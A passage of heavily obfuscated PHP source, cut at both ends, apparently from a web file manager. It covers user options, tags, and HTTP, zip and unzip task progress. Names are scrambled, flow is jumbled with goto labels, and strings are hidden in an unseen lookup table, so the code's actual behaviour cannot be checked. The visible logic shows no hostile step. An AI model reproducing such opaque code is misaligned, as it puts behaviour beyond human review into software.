$a¸¦ôÅ‰õğ); $this->_listAppendMeta($fÍƒÄÆ„Ã, $a¸¦ôÅ‰õğ); goto bŞèòÊëÓ¤; F³ê÷êçÓğ: } private function _listAppendSourceRoot(&$Bé‰ê¼íùä, $f±ñêÎƒÑœ) { goto eÙÏÆéŠÙ®; b¦èÃ¦îÔ„: $aäìØ„İ¿ë = Model($F—ŠÕÚ™Ø¹[754])->order($F—ŠÕÚ™Ø¹[2193])->field($e£êˆ™íÉé)->where($c™ÌŸÍ˜Â)->select(); $aäìØ„İ¿ë = array_to_keyvalue($aäìØ„İ¿ë, $F—ŠÕÚ™Ø¹[456]); $aäìØ„İ¿ë = array_remove_key($aäìØ„İ¿ë, $F—ŠÕÚ™Ø¹[456]); goto DÆ•Ë»Ñ¬‡; DÆ•Ë»Ñ¬‡: foreach ($Bé‰ê¼íùä as &$cØ‘–†Û«) { $cØ‘–†Û«[$F—ŠÕÚ™Ø¹[391]] = $aäìØ„İ¿ë[$cØ‘–†Û«[$F—ŠÕÚ™Ø¹[1439]]] ? $aäìØ„İ¿ë[$cØ‘–†Û«[$F—ŠÕÚ™Ø¹[1439]]] : array(); } goto Dˆ•Ê­†‚¿; eÙÏÆéŠÙ®: $F—ŠÕÚ™Ø¹ =& $_SERVER[”Ì÷ñ­î¸]; $c™ÌŸÍ˜Â = array($F—ŠÕÚ™Ø¹[461] => 0, $F—ŠÕÚ™Ø¹[371] => SourceModel::TYPE_USER, $F—ŠÕÚ™Ø¹[456] => array($F—ŠÕÚ™Ø¹[7], $f±ñêÎƒÑœ)); $e£êˆ™íÉé = $F—ŠÕÚ™Ø¹[2192]; goto b¦èÃ¦îÔ„; Dˆ•Ê­†‚¿: } private function _listAppendGroup(&$f”ñÁ›­µï, $E½ÃŞØÅ©÷) { goto A‡ÆáìÒ¤Â; A‡ÆáìÒ¤Â: $a³‹Çææ‡ƒ =& $_SERVER[”Ì÷ñ­î¸]; $D®²ÙëÕ©æ = array($a³‹Çææ‡ƒ[1439] => array($a³‹Çææ‡ƒ[7], $E½ÃŞØÅ©÷)); $d¬ÚÇÅ–±¼ = Model($a³‹Çææ‡ƒ[2180])->where($D®²ÙëÕ©æ)->select(); goto bÑç™ÕÁ¡; E¸¸Ëì: $D®²ÙëÕ©æ = array($a³‹Çææ‡ƒ[2106] => array($a³‹Çææ‡ƒ[7], $D¯ªº¥¡Ø)); $E¥†É¡¯÷ = Model($a³‹Çææ‡ƒ[2537])->field($a³‹Çææ‡ƒ[2538])->where($D®²ÙëÕ©æ)->select(); $cë‚†¼ àì = array_to_keyvalue($E¥†É¡¯÷, $a³‹Çææ‡ƒ[2106], $a³‹Çææ‡ƒ[28]); goto a¡ÑÓ²µëë; bÑç™ÕÁ¡: $D¯ªº¥¡Ø = array_to_keyvalue($d¬ÚÇÅ–±¼, $a³‹Çææ‡ƒ[33], $a³‹Çææ‡ƒ[2106]); $D¯ªº¥¡Ø = array_remove_value(array_unique($D¯ªº¥¡Ø), $a³‹Çææ‡ƒ[468]); if (!$D¯ªº¥¡Ø || !$d¬ÚÇÅ–±¼) { return; } goto E¸¸Ëì; a¡ÑÓ²µëë: $d¬ÚÇÅ–±¼ = array_to_keyvalue_group($d¬ÚÇÅ–±¼, $a³‹Çææ‡ƒ[1439]); foreach ($d¬ÚÇÅ–±¼ as &$EÌÍ µÃ•à) { $c‘ˆİ¾•Ô = array(); foreach ($EÌÍ µÃ•à as $D³Œ˜Ğõ) { if (!$D³Œ˜Ğõ[$a³‹Çææ‡ƒ[2234]]) { continue; } $f³²â§ˆğ = Model($a³‹Çææ‡ƒ[2253])->listData($D³Œ˜Ğõ[$a³‹Çææ‡ƒ[2234]]); $c‘ˆİ¾•Ô[] = array($a³‹Çææ‡ƒ[2106] => $D³Œ˜Ğõ[$a³‹Çææ‡ƒ[2106]], $a³‹Çææ‡ƒ[2539] => $cë‚†¼ àì[$D³Œ˜Ğõ[$a³‹Çææ‡ƒ[2106]]], $a³‹Çææ‡ƒ[376] => $f³²â§ˆğ); } $EÌÍ µÃ•à = $c‘ˆİ¾•Ô; } foreach ($f”ñÁ›­µï as &$CéÆ×»´ä) { $CéÆ×»´ä[$a³‹Çææ‡ƒ[2535]] = array(); if (isset($d¬ÚÇÅ–±¼[$CéÆ×»´ä[$a³‹Çææ‡ƒ[1439]]])) { $CéÆ×»´ä[$a³‹Çææ‡ƒ[2535]] = $d¬ÚÇÅ–±¼[$CéÆ×»´ä[$a³‹Çææ‡ƒ[1439]]]; } } goto d–¡Ç½à”; d–¡Ç½à”: } private function _listAppendMeta(&$EÉñóì¨¡, $eç¥ì¡¾ª¶) { goto döÂ“Çí‰; döÂ“Çí‰: $BË†ï‘®Ùé =& $_SERVER[”Ì÷ñ­î¸]; $Eï¾é†Ë…ç = UserJobModel::JOB_KEY; $D‡ËÀ¬‹á² = array($BË†ï‘®Ùé[2517]); goto Eò¦éæ‰£ª; Eò¦éæ‰£ª: $fèÊ²…·×µ = array($BË†ï‘®Ùé[1439] => array($BË†ï‘®Ùé[7], $eç¥ì¡¾ª¶)); $E–çêÅæ = Model($BË†ï‘®Ùé[2514])->where($fèÊ²…·×µ)->select(); $E–çêÅæ = array_to_keyvalue_group($E–çêÅæ, $BË†ï‘®Ùé[1439]); goto d‰ñğ‚; d‰ñğ‚: foreach ($E–çêÅæ as &$e¼–ˆ¯çòä) { $B©·ä£‹í = array(); foreach ($e¼–ˆ¯çòä as $bµµ„ƒ‡¢†) { if (!in_array($bµµ„ƒ‡¢†[$BË†ï‘®Ùé[89]], $D‡ËÀ¬‹á²)) { $B©·ä£‹í[$bµµ„ƒ‡¢†[$BË†ï‘®Ùé[89]]] = $bµµ„ƒ‡¢†[$BË†ï‘®Ùé[359]]; } } $e¼–ˆ¯çòä = $B©·ä£‹í; } $b“°†—ßˆ´ = Model($BË†ï‘®Ùé[2540]); foreach ($EÉñóì¨¡ as &$FÙó¥“øìé) { $DªÃÍÈÆäÎ = array(); if (isset($E–çêÅæ[$FÙó¥“øìé[$BË†ï‘®Ùé[1439]]])) { $DªÃÍÈÆäÎ = $E–çêÅæ[$FÙó¥“øìé[$BË†ï‘®Ùé[1439]]]; } $FÙó¥“øìé[$BË†ï‘®Ùé[2541]] = array(); if (isset($DªÃÍÈÆäÎ[$Eï¾é†Ë…ç])) { $FÙó¥“øìé[$BË†ï‘®Ùé[2541]] = $b“°†—ßˆ´->getUserJobInfo($DªÃÍÈÆäÎ[$Eï¾é†Ë…ç]); } } goto e£Â†Ç½; e£Â†Ç½: } public function userSearch($fóÇ£Õ±Ÿ•, $Dˆ…ù¤„”Ú = "\52") { return Model($_SERVER[”Ì÷ñ­î¸][477])->where($fóÇ£Õ±Ÿ•)->field($Dˆ…ù¤„”Ú)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\157\160\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($fš‚ö„¾Ãª) { $AĞÀ’„ß‹ =& $_SERVER[”Ì÷ñ­î¸]; if (!defined($AĞÀ’„ß‹[427])) { define($AĞÀ’„ß‹[427], 0); } return "\125\163\x65\162\x4f\x70\164\x69\157\x6e\x5f{$fš‚ö„¾Ãª}\137" . USER_ID; } protected function filterWhere($aÍˆèÈ¼³¢) { $C§¡œÕŞ¾ =& $_SERVER[”Ì÷ñ­î¸]; if (!defined($C§¡œÕŞ¾[427])) { define($C§¡œÕŞ¾[427], 0); } $aÍˆèÈ¼³¢[$C§¡œÕŞ¾[1439]] = USER_ID; return $aÍˆèÈ¼³¢; } public function cacheRemoveUser($DóèŒ‡”„¹, $A³ƒìÏ´×) { return Cache::remove("\x55\x73\145\x72\x4f\x70\x74\x69\x6f\156\137{$DóèŒ‡”„¹}\x5f" . $A³ƒìÏ´×); } protected function optionDefault($Dµî£ÈŠñ = '') { $EàÓ‡¶÷¿° =& $_SERVER[”Ì÷ñ­î¸]; if ($Dµî£ÈŠñ == $EàÓ‡¶÷¿°[33]) { return $GLOBALS[$EàÓ‡¶÷¿°[6]][$EàÓ‡¶÷¿°[2542]]; } if ($Dµî£ÈŠñ == $EàÓ‡¶÷¿°[2543]) { return $GLOBALS[$EàÓ‡¶÷¿°[6]][$EàÓ‡¶÷¿°[2544]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\162\x2e\x74\x61\147\x4c\x69\x73\x74"; public $modelType = "\x55\163\x65\162\x4f\160\x74\151\157\x6e"; public $field = array("\156\x61\x6d\x65", "\163\164\x79\x6c\145", "\x73\x6f\x72\x74"); public function listData($a®‡‰ô­ßÅ = false, $aË¬·Ü…Âà = "\x73\157\162\164", $e™ßÙç•µ× = false) { return parent::listData($a®‡‰ô­ßÅ, $aË¬·Ü…Âà, $e™ßÙç•µ×); } public function remove($bĞÇ˜Ôá›”) { return parent::remove($bĞÇ˜Ôá›”); } public function add($cÀÃÕÎÄƒ», $e‘ƒ‰Ø÷Öù = "\x6c\x61\142\145\154\x2d\x67\x72\x65\171\x2d\x6e\x6f\162\155\x61\154") { $eµ’öÉšòõ =& $_SERVER[”Ì÷ñ­î¸]; if ($this->findByName($cÀÃÕÎÄƒ»)) { return !1; } $EÌÙ¹¢¹‰ = array($eµ’öÉšòõ[386] => $cÀÃÕÎÄƒ», $eµ’öÉšòõ[437] => $e‘ƒ‰Ø÷Öù, $eµ’öÉšòõ[2110] => $this->getSort($eµ’öÉšòõ[246]) + 1); return parent::insert($EÌÙ¹¢¹‰); } public function update($Fƒƒãå¸½‰, $a¡òİš‹Òš) { $fÆ˜…·ğ  =& $_SERVER[”Ì÷ñ­î¸]; $F”•õòßĞ = $this->listData($Fƒƒãå¸½‰); $FÔëÙ¤‹İƒ = $this->findByName($a¡òİš‹Òš[$fÆ˜…·ğ [28]]); if (!$F”•õòßĞ || $FÔëÙ¤‹İƒ && $FÔëÙ¤‹İƒ[$fÆ˜…·ğ [367]] != $F”•õòßĞ[$fÆ˜…·ğ [367]]) { return !1; } return parent::update($Fƒƒãå¸½‰, $a¡òİš‹Òš); } public function moveTop($c£š×ĞË±ô) { $c…éÛ­¹®¢ =& $_SERVER[”Ì÷ñ­î¸]; $d‡œƒå¿â› = parent::listData(); $fâÈ°²™ìë = $this->getSort($c…éÛ­¹®¢[245]); foreach ($d‡œƒå¿â› as &$bÔÒƒ…“áæ) { if ($bÔÒƒ…“áæ[$c…éÛ­¹®¢[367]] == $c£š×ĞË±ô) { $bÔÒƒ…“áæ[$c…éÛ­¹®¢[2127]] = $fâÈ°²™ìë; continue; } $bÔÒƒ…“áæ[$c…éÛ­¹®¢[2127]] += 1; } return parent::resetData($d‡œƒå¿â›); } public function moveBottom($a¯ö‘²õô) { $Fà¡á±Úõ =& $_SERVER[”Ì÷ñ­î¸]; $d‰â¹¶ß¢† = $this->getSort($Fà¡á±Úõ[246]) + 1; return parent::update($a¯ö‘²õô, array($Fà¡á±Úõ[2127] => $d‰â¹¶ß¢†)); } public function resetSort($cÃÎ†ƒÈÑ) { goto F¥×ÊÈŸŞò; F¥×ÊÈŸŞò: $e•Ó¡‚ĞŞ =& $_SERVER[”Ì÷ñ­î¸]; $d™°¥ÑÏÂ = array(); $cÃÎ†ƒÈÑ = is_array($cÃÎ†ƒÈÑ) ? $cÃÎ†ƒÈÑ : array(); goto A¦™ƒÒ´‡¬; a‡ĞåÈ‘‹: return parent::resetData($FŸæ÷ŞŸ™®); goto B¾ ·ˆ¶º; A¦™ƒÒ´‡¬: for ($FÚ¿‘•´ñ = 0; $FÚ¿‘•´ñ < count($cÃÎ†ƒÈÑ); $FÚ¿‘•´ñ++) { $d™°¥ÑÏÂ[$cÃÎ†ƒÈÑ[$FÚ¿‘•´ñ] . $e•Ó¡‚ĞŞ[33]] = $FÚ¿‘•´ñ + 1; } $FŸæ÷ŞŸ™® = parent::listData(); foreach ($FŸæ÷ŞŸ™® as &$e‰‹‹–ÙÂÒ) { $f¥æˆÔÄÌ = $d™°¥ÑÏÂ[$e‰‹‹–ÙÂÒ[$e•Ó¡‚ĞŞ[367]]]; $e‰‹‹–ÙÂÒ[$e•Ó¡‚ĞŞ[2127]] = $f¥æˆÔÄÌ ? $f¥æˆÔÄÌ : $e‰‹‹–ÙÂÒ[$e•Ó¡‚ĞŞ[2127]]; } goto a‡ĞåÈ‘‹; B¾ ·ˆ¶º: } private function getSort($eùŸ©ñäï) { $E˜°›—»óº =& $_SERVER[”Ì÷ñ­î¸]; $CÈõ²Š¼ÌĞ = parent::listData(); $F§’¶¦ğ© = array_to_keyvalue($CÈõ²Š¼ÌĞ, $E˜°›—»óº[33], $E˜°›—»óº[2127]); if (!$F§’¶¦ğ©) { $F§’¶¦ğ© = array(0); } $Eäš¢‘‹©– = $eùŸ©ñäï == $E˜°›—»óº[246] ? max($F§’¶¦ğ©) : min($F§’¶¦ğ©); return intval($Eäš¢‘‹©–); } } goto F¢ß·ƒØË; FÁÚ”ö‹½: class TaskHttp extends Task { protected function startAfter() { $E‘¯Îåœ­ =& $_SERVER[”Ì÷ñ­î¸]; $aå†Ä‘Ç×÷ =& $this->task; $aå†Ä‘Ç×÷[$E‘¯Îåœ­[1503]] = 1; Hook::bind($E‘¯Îåœ­[1476], array($this, $E‘¯Îåœ­[1504])); Hook::bind($E‘¯Îåœ­[1478], array($this, $E‘¯Îåœ­[1505])); Hook::bind($E‘¯Îåœ­[1480], array($this, $E‘¯Îåœ­[1506])); } protected function endAfter() { $bŸÅë‰Òï· =& $_SERVER[”Ì÷ñ­î¸]; Hook::unbind($bŸÅë‰Òï·[1476], array($this, $bŸÅë‰Òï·[1504])); Hook::unbind($bŸÅë‰Òï·[1478], array($this, $bŸÅë‰Òï·[1505])); Hook::unbind($bŸÅë‰Òï·[1480], array($this, $bŸÅë‰Òï·[1506])); } public function progressStart($E· ¸¹çç“) { $Cíâ´•ôôš =& $_SERVER[”Ì÷ñ­î¸]; $Eõ²ñƒĞï­ = curl_getinfo($E· ¸¹çç“); self::log($Cíâ´•ôôš[1507] . $Eõ²ñƒĞï­[$Cíâ´•ôôš[295]]); self::valueSet($this->task[$Cíâ´•ôôš[367]], $this->task); } public function progressEnd($Fæä©ñŸÏ¹) { $Bé±¿¡† =& $_SERVER[”Ì÷ñ­î¸]; self::log($Bé±¿¡†[1508] . $this->task[$Bé±¿¡†[367]]); $this->end(); } public function progress($e•’Ã“ÎåÄ, $fªğª„˜ô±, $d”Ô™•¿à, $CÊåÔ¿ë©¸, $b–í¯‹Š“) { $CÄ‘Ş†âê¤ =& $_SERVER[”Ì÷ñ­î¸]; $eŞí•¦ˆ²É =& $this->task; if ($b–í¯‹Š“ > 0) { $eŞí•¦ˆ²É[$CÄ‘Ş†âê¤[978]] = $eŞí•¦ˆ²É[$CÄ‘Ş†âê¤[978]] == 0 ? $CÊåÔ¿ë©¸ : $eŞí•¦ˆ²É[$CÄ‘Ş†âê¤[978]]; $eŞí•¦ˆ²É[$CÄ‘Ş†âê¤[990]] = $b–í¯‹Š“; } else { if ($d”Ô™•¿à > 0) { $eŞí•¦ˆ²É[$CÄ‘Ş†âê¤[978]] = $eŞí•¦ˆ²É[$CÄ‘Ş†âê¤[978]] == 0 ? $fªğª„˜ô± : $eŞí•¦ˆ²É[$CÄ‘Ş†âê¤[978]]; $eŞí•¦ˆ²É[$CÄ‘Ş†âê¤[990]] = $d”Ô™•¿à; } } $this->update(); self::log("\160\x72\157\x67\x72\145\x73\x73\x48\164\x74\x70\72\x64\157\167\156\x3a{$d”Ô™•¿à}\57{$fªğª„˜ô±}\73\40\x75\x70\154\x6f\141\x64\x3a{$b–í¯‹Š“}\57{$CÊåÔ¿ë©¸}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto aÃÙƒóĞà; d•®”šÍƒ·: Hook::bind($Cä¢»áë˜[1035], array($this, $Cä¢»áë˜[1511])); $cçÄ°éÖøà =& $this->task; $cçÄ°éÖøà[$Cä¢»áë˜[1512]] = $Cä¢»áë˜[1040]; goto B¤Œ²âñ¼İ; B¤Œ²âñ¼İ: if (!$cçÄ°éÖøà[$Cä¢»áë˜[1344]]) { $cçÄ°éÖøà[$Cä¢»áë˜[1344]] = LNG($Cä¢»áë˜[1513]); } goto Aâ°½…ˆÕæ; aÃÙƒóĞà: $Cä¢»áë˜ =& $_SERVER[”Ì÷ñ­î¸]; parent::startAfter(); Hook::bind($Cä¢»áë˜[1509], array($this, $Cä¢»áë˜[1510])); goto d•®”šÍƒ·; Aâ°½…ˆÕæ: } protected function endAfter() { $aá†í”Ã¦ =& $_SERVER[”Ì÷ñ­î¸]; parent::endAfter(); Hook::unbind($aá†í”Ã¦[1509], array($this, $aá†í”Ã¦[1510])); Hook::unbind($aá†í”Ã¦[1035], array($this, $aá†í”Ã¦[1511])); } public function updateAfter() { $eÊÜªÚŸÏø =& $_SERVER[”Ì÷ñ­î¸]; $d¾½¹§Ã˜ =& $this->task; if (!$d¾½¹§Ã˜[$eÊÜªÚŸÏø[978]] || !$d¾½¹§Ã˜[$eÊÜªÚŸÏø[699]]) { return; } if ($d¾½¹§Ã˜[$eÊÜªÚŸÏø[1512]] == $eÊÜªÚŸÏø[1040]) { $aÖ¡Ôé¥’â = 0; if ($d¾½¹§Ã˜[$eÊÜªÚŸÏø[1484]]) { $aÖ¡Ôé¥’â = $d¾½¹§Ã˜[$eÊÜªÚŸÏø[1485]] / $d¾½¹§Ã˜[$eÊÜªÚŸÏø[1484]]; } $d¾½¹§Ã˜[$eÊÜªÚŸÏø[1440]] = $aÖ¡Ôé¥’â * 0.3; } else { if ($d¾½¹§Ã˜[$eÊÜªÚŸÏø[1512]] == $eÊÜªÚŸÏø[301]) { $aÖ¡Ôé¥’â = $d¾½¹§Ã˜[$eÊÜªÚŸÏø[990]] / $d¾½¹§Ã˜[$eÊÜªÚŸÏø[978]]; $d¾½¹§Ã˜[$eÊÜªÚŸÏø[1440]] = 0.3 + $aÖ¡Ôé¥’â * 0.4; } else { if ($d¾½¹§Ã˜[$eÊÜªÚŸÏø[1512]] == $eÊÜªÚŸÏø[103]) { $a®¸Ó´„™ë = 0; if ($d¾½¹§Ã˜[$eÊÜªÚŸÏø[1486]] == $eÊÜªÚŸÏø[103]) { $a®¸Ó´„™ë = $d¾½¹§Ã˜[$eÊÜªÚŸÏø[1485]]; } $aÖ¡Ôé¥’â = ($d¾½¹§Ã˜[$eÊÜªÚŸÏø[1489]] + $a®¸Ó´„™ë) / $d¾½¹§Ã˜[$eÊÜªÚŸÏø[699]]; $d¾½¹§Ã˜[$eÊÜªÚŸÏø[1440]] = 0.3 + 0.4 + $aÖ¡Ôé¥’â * 0.3; } } } if ($d¾½¹§Ã˜[$eÊÜªÚŸÏø[1440]] > 0) { $bê÷«ïï½ƒ = timeFloat() - $d¾½¹§Ã˜[$eÊÜªÚŸÏø[1442]] - $d¾½¹§Ã˜[$eÊÜªÚŸÏø[1445]]; $d¾½¹§Ã˜[$eÊÜªÚŸÏø[1446]] = $bê÷«ïï½ƒ * (1 - $d¾½¹§Ã˜[$eÊÜªÚŸÏø[1440]]) / $d¾½¹§Ã˜[$eÊÜªÚŸÏø[1440]]; } } public function addFile($cÚµ˜öóŞˆ) { goto B«¹±ŸÀÎ¬; f®‡ãª¦…Ò: $dŸ¹Ú¢©Ş[$BØÁæéÂî´[1482]] = $a¶›ë „²í[$BØÁæéÂî´[28]]; $dŸ¹Ú¢©Ş[$BØÁæéÂî´[1484]] = $a¶›ë „²í[$BØÁæéÂî´[77]]; $dŸ¹Ú¢©Ş[$BØÁæéÂî´[1485]] = 0; goto e‚µè‡Ø³Õ; bß²ÖÊ´¶: $this->update(); goto c¨ÙØÜ†â¹; cÙÒª…¦‚®: $dŸ¹Ú¢©Ş[$BØÁæéÂî´[978]] = 1; $FØµÆ­åäô = 0; $dŸ¹Ú¢©Ş[$BØÁæéÂî´[1493]] = array($BØÁæéÂî´[1494] => $FØµÆ­åäô + 1, $BØÁæéÂî´[386] => $a¶›ë „²í[$BØÁæéÂî´[28]], $BØÁæéÂî´[75] => $a¶›ë „²í[$BØÁæéÂî´[75]], $BØÁæéÂî´[466] => $a¶›ë „²í[$BØÁæéÂî´[466]] ? $a¶›ë „²í[$BØÁæéÂî´[466]] : $a¶›ë „²í[$BØÁæéÂî´[75]]); goto bß²ÖÊ´¶; B«¹±ŸÀÎ¬: $BØÁæéÂî´ =& $_SERVER[”Ì÷ñ­î¸]; $dŸ¹Ú¢©Ş =& $this->task; $a¶›ë „²í = IO::info($cÚµ˜öóŞˆ); goto f®‡ãª¦…Ò; e‚µè‡Ø³Õ: $dŸ¹Ú¢©Ş[$BØÁæéÂî´[980]] = $BØÁæéÂî´[1501]; $dŸ¹Ú¢©Ş[$BØÁæéÂî´[1486]] = $BØÁæéÂî´[1040]; $dŸ¹Ú¢©Ş[$BØÁæéÂî´[699]] = $a¶›ë „²í[$BØÁæéÂî´[77]]; goto cÙÒª…¦‚®; c¨ÙØÜ†â¹: } public function unzipAfter($cõ¡è¿…æ¸) { goto c®öš–’‰; eŒøù‘Ê‹: $this->update(); self::log($d¿¾Ë†öàª[1514] . json_encode(array($a‰ë—‘ñí, $CğÂ©¹İ¸))); goto d¯§Ä§—ó; eÙö†‹¥Ç³: $a‰ë—‘ñí[$d¿¾Ë†öàª[1482]] = $d¿¾Ë†öàª[33]; $a‰ë—‘ñí[$d¿¾Ë†öàª[1489]] = 0; $a‰ë—‘ñí[$d¿¾Ë†öàª[699]] = $CğÂ©¹İ¸[$d¿¾Ë†öàª[77]]; goto eŒøù‘Ê‹; e·ß÷¡ˆ: $CğÂ©¹İ¸ = IO::infoWithChildren($cõ¡è¿…æ¸); $D‡ÉğØïÌ® = 0; $a‰ë—‘ñí[$d¿¾Ë†öàª[1493]] = array($d¿¾Ë†öàª[1494] => $D‡ÉğØïÌ® + 1, $d¿¾Ë†öàª[386] => $CğÂ©¹İ¸[$d¿¾Ë†öàª[28]], $d¿¾Ë†öàª[75] => $CğÂ©¹İ¸[$d¿¾Ë†öàª[75]], $d¿¾Ë†öàª[466] => $CğÂ©¹İ¸[$d¿¾Ë†öàª[466]] ? $CğÂ©¹İ¸[$d¿¾Ë†öàª[466]] : $CğÂ©¹İ¸[$d¿¾Ë†öàª[75]]); goto D×£©Şİ„®; c®öš–’‰: $d¿¾Ë†öàª =& $_SERVER[”Ì÷ñ­î¸]; $a‰ë—‘ñí =& $this->task; $a‰ë—‘ñí[$d¿¾Ë†öàª[1512]] = $d¿¾Ë†öàª[103]; goto e·ß÷¡ˆ; D¹×àæ– : $a‰ë—‘ñí[$d¿¾Ë†öàª[990]] = 0; $a‰ë—‘ñí[$d¿¾Ë†öàª[1484]] = 0; $a‰ë—‘ñí[$d¿¾Ë†öàª[1485]] = 0; goto eÙö†‹¥Ç³; D×£©Şİ„®: if ($CğÂ©¹İ¸[$d¿¾Ë†öàª[29]] == $d¿¾Ë†öàª[167]) { $a‰ë—‘ñí[$d¿¾Ë†öàª[978]] = 1; } else { $a‰ë—‘ñí[$d¿¾Ë†öàª[978]] = $CğÂ©¹İ¸[$d¿¾Ë†öàª[80]][$d¿¾Ë†öàª[78]]; } $a‰ë—‘ñí[$d¿¾Ë†öàª[980]] = $d¿¾Ë†öàª[33]; $a‰ë—‘ñí[$d¿¾Ë†öàª[1486]] = 0; goto D¹×àæ– ; d¯§Ä§—ó: } public function nameParse($bÒ¨œ¼†³) { goto e¸ÏÆ„®·¦; e¸ÏÆ„®·¦: $EŸ†ù‚Ïï§ =& $_SERVER[”Ì÷ñ­î¸]; $E…Ë©°šİ =& $this->task; if ($E…Ë©°šİ[$EŸ†ù‚Ïï§[1512]] == $EŸ†ù‚Ïï§[1040]) { $E…Ë©°šİ[$EŸ†ù‚Ïï§[1512]] = $EŸ†ù‚Ïï§[301]; $E…Ë©°šİ[$EŸ†ù‚Ïï§[1489]] = 0; $E…Ë©°šİ[$EŸ†ù‚Ïï§[699]] = 0; } goto AƒòÍ½‚•Ñ; AƒòÍ½‚•Ñ: $EåÒ˜ø…ºÌ = get_path_this($bÒ¨œ¼†³); if (strstr($EåÒ˜ø…ºÌ, $EŸ†ù‚Ïï§[91])) { $E…Ë©°šİ[$EŸ†ù‚Ïï§[990]] += 1; $E…Ë©°šİ[$EŸ†ù‚Ïï§[978]] += 1; } $E…Ë©°šİ[$EŸ†ù‚Ïï§[1482]] = $bÒ¨œ¼†³; goto båîÀ‰; båîÀ‰: $this->update(); goto f†à‹àÙ´; f†à‹àÙ´: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $EÑ™´Ëáå =& $_SERVER[”Ì÷ñ­î¸]; parent::startAfter(); Hook::bind($EÑ™´Ëáå[1515], array($this, $EÑ™´Ëáå[1510])); $EÎ¢‚Ÿèî =& $this->task; $EÎ¢‚Ÿèî[$EÑ™´Ëáå[1512]] = $EÑ™´Ëáå[1040]; if (!$EÎ¢‚Ÿèî[$EÑ™´Ëáå[1344]]) { $EÎ¢‚Ÿèî[$EÑ™´Ëáå[1344]] = LNG($EÑ™´Ëáå[1516]); } } protected function endAfter() { $B‡¿ÒœÌ±… =& $_SERVER[”Ì÷ñ­î¸]; parent::endAfter(); Hook::unbind($B‡¿ÒœÌ±…[1515], array($this, $B‡¿ÒœÌ±…[1510])); } public function updateAfter() { $FÓñß‡µ¦¤ =& $_SERVER[”Ì÷ñ­î¸]; $FÇÕøŸ˜åö =& $this->task; if (!$FÇÕøŸ˜åö[$FÓñß‡µ¦¤[978]] || !$FÇÕøŸ˜åö[$FÓñß‡µ¦¤[699]]) { return; } if ($FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1512]] == $FÓñß‡µ¦¤[1040]) { $aÓœƒÈç†ƒ = $FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1485]]; if ($FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1486]] != $FÓñß‡µ¦¤[1040]) { $aÓœƒÈç†ƒ = 0; } $DŒè¢ó÷—± = ($FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1489]] + $aÓœƒÈç†ƒ) / $FÇÕøŸ˜åö[$FÓñß‡µ¦¤[699]]; $FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1440]] = $DŒè¢ó÷—± * 0.3; } else { if ($FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1512]] == $FÓñß‡µ¦¤[301]) { $DŒè¢ó÷—± = $FÇÕøŸ˜åö[$FÓñß‡µ¦¤[990]] / $FÇÕøŸ˜åö[$FÓñß‡µ¦¤[978]]; $FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1440]] = 0.3 + $DŒè¢ó÷—± * 0.5; } else { if ($FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1512]] == $FÓñß‡µ¦¤[103]) { $DŒè¢ó÷—± = 0; if ($FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1484]]) { $DŒè¢ó÷—± = $FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1485]] / $FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1484]]; } $FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1440]] = 0.3 + 0.5 + $DŒè¢ó÷—± * 0.2; } } } if ($FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1440]] > 0) { $b±•Ë’ñÙ = timeFloat() - $FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1442]] - $FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1445]]; $FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1446]] = $b±•Ë’ñÙ * (1 - $FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1440]]) / $FÇÕøŸ˜åö[$FÓñß‡µ¦¤[1440]]; } } public function copyFileStart($eéö‰…‰â¾, $dõ¬³°åµ, $FÊÑÆóÀÊƒ, $eÇøëõîåŒ, $BÇ´ãËØéÁ, $dëÂÌ¥¤¤£) { $d§ù‚ª–õì =& $_SERVER[”Ì÷ñ­î¸]; parent::copyFileStart($eéö‰…‰â¾, $dõ¬³°åµ, $FÊÑÆóÀÊƒ, $eÇøëõîåŒ, $BÇ´ãËØéÁ, $dëÂÌ¥¤¤£); $cÙ÷Ïá„í =& $this->task; if ($cÙ÷Ïá„í[$d§ù‚ª–õì[1512]] == $d§ù‚ª–õì[301]) { $cÙ÷Ïá„í[$d§ù‚ª–õì[1512]] = $d§ù‚ª–õì[103]; } $this->update(); } public function copyFileEnd($FÓ”Ï”‡Ğ”, $bŒİ›‡ —¬, $EÁ¢®÷Ã„¨, $EÏË¬ÎîğÍ, $AÈÎ»Çµèœ, $dİÆŠ·¿˜) { $cÕò•Œ©„ =& $_SERVER[”Ì÷ñ­î¸]; $Bˆœ«Ü†¯ê =& $this->task; $Bˆœ«Ü†¯ê[$cÕò•Œ©„[1485]] = $Bˆœ«Ü†¯ê[$cÕò•Œ©„[1484]]; $Bˆœ«Ü†¯ê[$cÕò•Œ©„[1489]] += $Bˆœ«Ü†¯ê[$cÕò•Œ©„[1484]]; $Bˆœ«Ü†¯ê[$cÕò•Œ©„[1486]] = $cÕò•Œ©„[33]; $this->update(); } public function nameParse($F¤¥ùĞÀµ) { $d»÷øô¢ëá =& $_SERVER[”Ì÷ñ­î¸]; $E³›»¼æ =& $this->task; if ($E³›»¼æ[$d»÷øô¢ëá[990]] < $E³›»¼æ[$d»÷øô¢ëá[978]]) { $F¢—›ù‡µö = get_path_this($F¤¥ùĞÀµ); if (strstr($F¢—›ù‡µö, $d»÷øô¢ëá[91])) { $E³›»¼æ[$d»÷øô¢ëá[990]] += 1; } } if ($E³›»¼æ[$d»÷øô¢ëá[1512]] == $d»÷øô¢ëá[1040]) { $E³›»¼æ[$d»÷øô¢ëá[1512]] = 